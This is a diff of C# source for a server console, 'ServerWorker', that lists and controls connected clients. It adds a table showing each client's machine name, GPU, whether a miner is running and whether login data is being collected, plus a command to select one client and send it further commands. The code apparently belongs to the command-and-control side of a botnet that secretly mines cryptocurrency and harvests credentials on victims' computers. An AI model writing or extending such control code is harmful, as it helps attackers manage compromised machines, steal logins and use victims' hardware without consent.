@@ -5,24 +5,27 @@ using System.Collections.Generic;
 
 namespace ServerWorker.ConsoleView
 {
-    public class ConsoleViewCommands
+    public class ConsoleViewCommands : IConsoleCommands
     {
-
-        private List<String> _excludedMethods = new List<string>() 
+        public Action<IConsoleCommands> SwithCommander {get; set;} = delegate { };
+        private string drawUsersTableFormat = "{0,-7}|{1, -7}|{2, -25}|{3, -20}|{4, -25}|{5, -7}|{6, -2}|{7, -4}";
+        private List<String> _excludedMethods = new List<string>()
         {
             "Equals",
             "GetHashCode",
             "GetType",
             "ToString"
         };
-        public ConsoleViewCommands()
-        {
-        }
 
         public void Help()
         {
             var methods = GetType().GetMethods().ToList();
-            methods.Where(x => !_excludedMethods.Contains(x.Name)).ToList().ForEach(x => Console.WriteLine(x.Name));
+            methods.Where(x => !_excludedMethods.Contains(x.Name)).ToList().ForEach(x => 
+            {
+                var parametrs = x.GetParameters().Select(p => p.ParameterType.Name + " " + p.Name).ToList();
+
+                Console.WriteLine("{0}({1})",x.Name, string.Join(",", parametrs));
+            });
         }
 
         public void StartServer()
@@ -36,7 +39,30 @@ namespace ServerWorker.ConsoleView
 
             foreach (var user in ServerNet.ConnectedUsers.ToArray())
             {
-                Console.WriteLine(user.EndPoint);
+                if (user.userData != null)
+                {
+                    Console.WriteLine(String.Format(drawUsersTableFormat, 
+                    user.UserType.ToString(),
+                    user.userData.setting.Version ?? "",
+                    user.userData.setting.Comp_name ?? user.userData.id ?? "",
+                    user.EndPoint.ToString(),
+                    user.userData.infoDevice.GPUVideoProcessor.Count > 0 ? user.userData.infoDevice.GPUVideoProcessor[0] : "",
+                    user.userData.IsWorkinMiner.ToString(),
+                    user.userData.IsGettingLoginData ? "V" : "",
+                    user.Ping.ToString()));
+                }
+                else
+                {
+                    Console.WriteLine(String.Format(drawUsersTableFormat, 
+                        user.UserType.ToString(),
+                        "",
+                        "",
+                        user.EndPoint.ToString(),
+                        "",
+                        "",
+                        "",
+                        ""));
+                }
             }
         }
 
@@ -57,9 +83,22 @@ namespace ServerWorker.ConsoleView
                 Console.WriteLine("Пользователь с адресом {0} не найден", userEndPoint);
                 return;
             }
-            
+
             Console.WriteLine(user.EndPoint + " >> DownloadUpdate");
             user.UsersCom.DownloadUpdate();
+        }
+
+        public void Select(string userEndPoint)
+        {
+            var user = ServerNet.ConnectedUsers.ToArray().FirstOrDefault(usr => usr.EndPoint.ToString() == userEndPoint);
+
+            if (user == null)
+            {
+                Console.WriteLine("Пользователь с адресом {0} не найден", userEndPoint);
+                return;
+            }
+
+            SwithCommander.Invoke(new ConsoleViewUserCommands(user));
         }
 
         public void Exit()
